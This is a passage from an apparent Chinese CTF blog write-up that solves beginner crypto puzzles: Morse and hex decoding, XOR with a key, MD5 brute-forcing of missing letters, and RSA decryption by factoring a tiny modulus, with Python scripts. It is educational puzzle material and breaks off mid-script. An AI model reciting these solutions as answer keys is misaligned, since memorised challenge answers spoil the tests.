<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span>…<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span>…<span class="token operator">/</span><span class="token operator">-</span>…<span class="token operator">/</span><span class="token operator">-</span>…<span class="token operator">/</span>…–<span class="token operator">/</span><span class="token operator">-</span><span class="token operator">-</span>…<span class="token operator">/</span>…<span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span>…<span class="token operator">/</span><span class="token operator">-</span>…<span class="token operator">/</span>–…<span class="token operator">/</span><span class="token operator">-</span>…<span class="token operator">/</span>…–<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">/</span>–…<span class="token operator">/</span>…–<span class="token operator">/</span>…—<span class="token operator">/</span>–…<span class="token operator">/</span>–…<span class="token operator">/</span>…<span class="token operator">-</span><span class="token operator">/</span>…<span class="token operator">/</span>…<span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">/</span>–…<span class="token operator">/</span>…–<span class="token operator">/</span>…–<span class="token operator">/</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">/</span>…<span class="token operator">/</span>…<span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">/</span>…–<span class="token operator">/</span>…–<span class="token operator">/</span>…–<span class="token operator">/</span>…<span class="token operator">-</span><span class="token operator">/</span>…–<span class="token operator">/</span>…<span class="token operator">/</span>–…<span class="token operator">/</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">/</span>–…<span class="token operator">/</span><span class="token operator">-</span>…</pre></td></tr></table></figure><p>看到题目给的这个，以及题目名字就会下意识反应到时 Morse 密码了，然后把 / 换成空格解码出</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/8e1efdf8c68344a1a85c8f2f752b7db.png" alt="8e1efdf8c68344a1a85c8f2f752b7db" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>61666374667B317327745F73305F333435797D</pre></td></tr></table></figure><p>发现条字符串存在英文，而且没有超过 f 的字母怀疑时 hex，查找 ascii 码表 7d，发现正好是’}’。</p>
<p>hex 解码得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/d770d23e31d1fb6cdcaf44081ef6e17.png" alt="d770d23e31d1fb6cdcaf44081ef6e17" /></p>
<h2 id="异性相吸"><a class="anchor" href="#异性相吸">#</a> 异性相吸</h2>
<p>最近出现了一个奇葩观点，说性别都不一样，怎么能谈恋爱？为了证明这个观点错误，请大家证明异性是相吸的。 注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目得到密文和 key</p>
<pre><code>密文：ἇ̀Ј唒ဃ塔屋䩘卖剄䐃堂ن䝔嘅均ቄ䩝ᬔ
key:asadsasdasdasdasdasdasdasdasdasdqwesqf
</code></pre>
<p>解题思路：<br />
这道题由题目可看出是，异或解密<br />
所以直接按照异或原理编写脚本解题</p>
<pre><code>key=open('key.txt').read()
se=open('密文.txt').read()
flag=''
for i in range(0,len(key)):
    res=ord(key[i])^ord(se[i])
    flag=flag+chr(res)
print(flag)
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/26bd6fee86db8fbf9e6fb61c7131a26.png" alt="26bd6fee86db8fbf9e6fb61c7131a26" /></p>
<h2 id="还原大师"><a class="anchor" href="#还原大师">#</a> 还原大师</h2>
<p>我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM, 问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的 32 位 MD5 码。但是我们获得它的 32 位 MD5 码也是残缺不全，E903???4DAB????08?????51?80??8A?, 请猜出神秘字符串的原本模样，并且提交这个字串的 32 位 MD5 码作为答案。 注意：得到的 flag 请包上 flag {} 提交</p>
<p>看题目大概是一串字符串，有三个明文是未知的。然后也有一串明文 MD5 加密的内容，也有部分是未知的。只缺了三个且是大写中文，则直接爆破 26<em>26</em>26 此就能得到答案了。直接写脚本爆破</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLNMOPQRSTUVWXYZ'</span></pre></td></tr><tr><td data-num="3"></td><td><pre>a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            tmp <span class="token operator">=</span> <span class="token string">'TASC'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'O3RJMV'</span> <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">'WDJKX'</span> <span class="token operator">+</span> k <span class="token operator">+</span> <span class="token string">'ZM'</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            a<span class="token punctuation">.</span>update<span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            tmp_md5 <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span>tmp_md5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'E903'</span> <span class="token keyword">and</span> tmp_md5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'4DAB'</span> <span class="token keyword">and</span> tmp_md5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'08'</span> <span class="token keyword">and</span> tmp_md5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'51'</span> <span class="token keyword">and</span> tmp_md5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'80'</span> <span class="token keyword">and</span> tmp_md5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'8A'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span>tmp_md5<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>得到答案</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/074bbc046f3a3b6cee9d10e6f3f44e6.png" alt="074bbc046f3a3b6cee9d10e6f3f44e6" /></p>
<h2 id="rsa-2"><a class="anchor" href="#rsa-2">#</a> RSA</h2>
<p>RSA 注意：得到的 flag 请包上 flag {} 提交</p>
<p>打开题目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/d6d55be98a5be6e3197f3ccb7096453.png" alt="d6d55be98a5be6e3197f3ccb7096453" /></p>
<p>此时可以利用工具 RSA-Tool2 by tE</p>
<p>先将 e,p,q 输入进去，再点击 Calc.D, 获得 d（给出 p,q,e 的话直接填入，再点击 Calc.D, 获得 d）<br />
（注：给出的是 n 和 e 的话，输入 n 和 e，点击 Factor N (分解)，得到 p,q, 再重复上一步步就能得到 d 了）<br />
Public Exponent 这里要使用 16 进制的数，如果公钥 e=17 的话，就应该填入十六进制的 11</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/a1ce8a388bc77b680a563fa990dad41.png" alt="a1ce8a388bc77b680a563fa990dad41" /></p>
<h2 id="rsaroll"><a class="anchor" href="#rsaroll">#</a> RSAROLL</h2>
<p>注意：得到的 flag 请包上 flag {} 提交。</p>
<p>题目</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>RSA roll！roll！roll！</pre></td></tr><tr><td data-num="2"></td><td><pre>Only number <span class="token keyword">and</span> a<span class="token operator">-</span>z</pre></td></tr><tr><td data-num="3"></td><td><pre>（don't use editor</pre></td></tr><tr><td data-num="4"></td><td><pre>which MS provide）</pre></td></tr></table></figure><p>date</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span><span class="token number">920139713</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">704796792</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">752211152</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">274704164</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">18414022</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">368270835</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">483295235</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">263072905</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">459788476</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">483295235</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">459788476</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">663551792</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">475206804</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">459788476</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">428313374</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">475206804</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">459788476</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">425392137</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">704796792</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">458265677</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token number">341524652</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token number">483295235</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token number">534149509</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token number">425392137</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">428313374</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token number">425392137</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token number">341524652</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token number">458265677</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token number">263072905</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token number">483295235</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token number">828509797</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token number">341524652</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token number">425392137</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token number">475206804</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token number">428313374</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token number">483295235</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token number">475206804</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token number">459788476</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token number">306220148</span></pre></td></tr></table></figure><p>可知：n=920139713</p>
<p>e=19</p>
<p>c=[704796792,……]</p>
<p>目标：密文解密序列 [m1,m2……]</p>
<p>思路：</p>
<p>分解 n，得 p,q 根据 p,q 获得欧拉数，根据欧拉数 获得 d，根据 d 获得 m</p>
<p>步骤：</p>
<ol>
<li>分解 n 得 p,q</li>
</ol>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">crackN</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    i<span class="token operator">=</span><span class="token number">2</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">while</span> i<span class="token operator">&lt;</span>n<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">if</span> n <span class="token operator">%</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>          <span class="token keyword">break</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span></pre></td></tr><tr><td data-num="7"></td><td><pre> </pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr></table></figure><ol start="2">
<li>根据 p,q 获得欧拉数</li>
</ol>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>o_n<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token operator">/</span>p<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr></table></figure><ol start="3">
<li>根据扩展欧几里得算法 获得 d</li>
</ol>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">exgcd</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>                x <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="4"></td><td><pre>                y <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                <span class="token keyword">return</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        a1 <span class="token operator">=</span> b <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        a <span class="token operator">=</span> b1 <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        c <span class="token operator">=</span> m</pre></td></tr><tr><td data-num="9"></td><td><pre>        d <span class="token operator">=</span> n</pre></td></tr><tr><td data-num="10"></td><td><pre>        q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token operator">/</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        r <span class="token operator">=</span> c<span class="token operator">%</span>d</pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">while</span> r<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                c <span class="token operator">=</span> d</pre></td></tr><tr><td data-num="14"></td><td><pre>                d <span class="token operator">=</span> r</pre></td></tr><tr><td data-num="15"></td><td><pre>                t <span class="token operator">=</span> a1</pre></td></tr><tr><td data-num="16"></td><td><pre>                a1 <span class="token operator">=</span> a</pre></td></tr><tr><td data-num="17"></td><td><pre>                a <span class="token operator">=</span> t<span class="token operator">-</span>q<span class="token operator">*</span>a</pre></td></tr><tr><td data-num="18"></td><td><pre>                t <span class="token operator">=</span> b1</pre></td></tr><tr><td data-num="19"></td><td><pre>                b1 <span class="token operator">=</span> b</pre></td></tr><tr><td data-num="20"></td><td><pre>                b <span class="token operator">=</span> t<span class="token operator">-</span>q<span class="token operator">*</span>b</pre></td></tr><tr><td data-num="21"></td><td><pre>                q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token operator">/</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                r <span class="token operator">=</span> c<span class="token operator">%</span>d</pre></td></tr><tr><td data-num="23"></td><td><pre>        x <span class="token operator">=</span> a</pre></td></tr><tr><td data-num="24"></td><td><pre>        y <span class="token operator">=</span> b</pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">(</span>d<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></pre></td></tr></table></figure><p>返回值为数组，y 为 rsa 算法中的 d</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>d<span class="token operator">=</span>exgcd<span class="token punctuation">(</span>o_n<span class="token punctuation">,</span>e<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr></table></figure><ol start="4">
<li>根据 d 解密密文 c 获得 m</li>
</ol>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><ol start="5">
<li>遍历密文数组 c 获得 m 序列</li>
</ol>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>s<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">while</span> k<span class="token operator">&lt;</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>              s<span class="token operator">=</span>s<span class="token operator">+</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>              k<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span></pre></td></tr></table></figure><p>完整脚本：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>e<span class="token operator">=</span><span class="token number">19</span></pre></td></tr><tr><td data-num="2"></td><td><pre>n<span class="token operator">=</span><span class="token number">920139713</span></pre></td></tr><tr><td data-num="3"></td><td><pre>c<span class="token operator">=</span><span class="token punctuation">[</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">704796792</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">752211152</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">274704164</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">18414022</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">368270835</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">483295235</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">263072905</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">459788476</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">483295235</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">459788476</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">663551792</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">475206804</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">459788476</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">428313374</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">475206804</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">459788476</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">425392137</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">704796792</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token number">458265677</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token number">341524652</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token number">483295235</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token number">534149509</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">425392137</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token number">428313374</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token number">425392137</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token number">341524652</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token number">458265677</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token number">263072905</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token number">483295235</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token number">828509797</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token number">341524652</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token number">425392137</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token number">475206804</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token number">428313374</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token number">483295235</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token number">475206804</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token number">459788476</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token number">306220148</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token keyword">def</span> <span class="token function">exgcd</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                x <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="46"></td><td><pre>                y <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="47"></td><td><pre>                <span class="token keyword">return</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        a1 <span class="token operator">=</span> b <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        a <span class="token operator">=</span> b1 <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        c <span class="token operator">=</span> m</pre></td></tr><tr><td data-num="51"></td><td><pre>        d <span class="token operator">=</span> n</pre></td></tr><tr><td data-num="52"></td><td><pre>        q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token operator">/</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        r <span class="token operator">=</span> c<span class="token operator">%</span>d</pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token keyword">while</span> r<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                c <span class="token operator">=</span> d</pre></td></tr><tr><td data-num="56"></td><td><pre>                d <span class="token operator">=</span> r</pre></td></tr><tr><td data-num="57"></td><td><pre>                t <span class="token operator">=</span> a1</pre></td></tr><tr><td data-num="58"></td><td><pre>                a1 <span class="token operator">=</span> a</pre></td></tr><tr><td data-num="59"></td><td><pre>                a <span class="token operator">=</span> t<span class="token operator">-</span>q<span class="token operator">*</span>a</pre></td></tr><tr><td data-num="60"></td><td><pre>                t <span class="token operator">=</span> b1</pre></td></tr><tr><td data-num="61"></td><td><pre>                b1 <span class="token operator">=</span> b</pre></td></tr><tr><td data-num="62"></td><td><pre>                b <span class="token operator">=</span> t<span class="token operator">-</span>q<span class="token operator">*</span>b</pre></td></tr><tr><td data-num="63"></td><td><pre>                q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token operator">/</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>                r <span class="token operator">=</span> c<span class="token operator">%</span>d</pre></td></tr><tr><td data-num="65"></td><td><pre>        x <span class="token operator">=</span> a</pre></td></tr><tr><td data-num="66"></td><td><pre>        y <span class="token operator">=</span> b</pre></td></tr><tr><td data-num="67"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">(</span>d<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token keyword">def</span> <span class="token function">crackN</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    i<span class="token operator">=</span><span class="token number">2</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token keyword">while</span> i<span class="token operator">&lt;</span>n<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="71"></td><td><pre>        <span class="token keyword">if</span> n <span class="token operator">%</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="72"></td><td><pre>          <span class="token keyword">break</span></pre></td></tr><tr><td data-num="73"></td><td><pre>        i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token keyword">return</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>p<span class="token operator">=</span>crackN<span class="token punctuation">(</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre>k<span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="79"></td><td><pre>o_n<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token operator">/</span>p<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>d<span class="token operator">=</span>exgcd<span class="token punctuation">(</span>o_n<span class="token punctuation">,</span>e<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr><tr><td 